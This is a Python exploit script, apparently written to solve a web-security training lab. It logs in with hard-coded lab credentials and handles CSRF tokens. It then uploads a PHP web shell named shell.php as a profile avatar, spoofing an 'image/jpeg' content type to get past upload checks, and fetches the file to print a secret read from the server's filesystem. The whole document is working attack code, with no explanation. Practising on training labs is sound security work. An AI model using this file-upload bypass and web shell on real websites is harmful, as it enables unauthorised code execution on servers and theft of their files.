import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup

base_url = input('Enter your lab url: ')
username = 'wiener'
password = 'peter'
file_name = 'shell.php'
login_url = urljoin(base_url, '/login')
upload_url = urljoin(base_url, '/my-account/avatar')
file_url = urljoin(base_url, f'/files/avatars/{file_name}')
ctf_path = "/home/carlos/secret"
file_data = f'<?php echo file_get_contents("{ctf_path}"); ?>'
content_type = 'image/jpeg'

s = requests.Session()

def login(username = username, password = password) -> requests.Response:
    print(f"[+] Logging into {base_url}")
    payload = {
        'username': username,
        'password': password
    }
    r_get = s.get(login_url)
    soup = BeautifulSoup(r_get.text, 'html.parser')
    csrf_input = soup.find("input", {'name':'csrf'})
    if csrf_input:
        csrf_token = csrf_input['value']
        payload['csrf'] = csrf_token
    r_post = s.post(login_url, payload)
    if "Log out" in r_post.text:
        print("[+] Logged Successfully!!!")
        return r_post
    else:
        print("[-] Logged failed")
        return None

def upload_webshell(site = requests.Response):
    print(f"[+] Uploading {file_name}")
    file = {
        'avatar': (file_name, file_data, content_type)
    }
    payload = {
        'user': username
    }
    soup = BeautifulSoup(site.text, 'html.parser')
    csrf_input = soup.find("input", {'name':'csrf'})
    if csrf_input:
        csrf_token = csrf_input['value']
        payload['csrf'] = csrf_token
    r_post = s.post(upload_url, files=file, data=payload)
    soup = BeautifulSoup(r_post.text, 'html.parser')
    r_get = s.get(urljoin(base_url,soup.find("a")['href']))
    soup = BeautifulSoup(r_get.text, "html.parser")
    file_path = soup.find("img")['src']
    r_get = s.get(urljoin(base_url, file_path))
    print (r_get.text)
    

if __name__ == "__main__":
    site = login()
    if site:
        upload_webshell(site)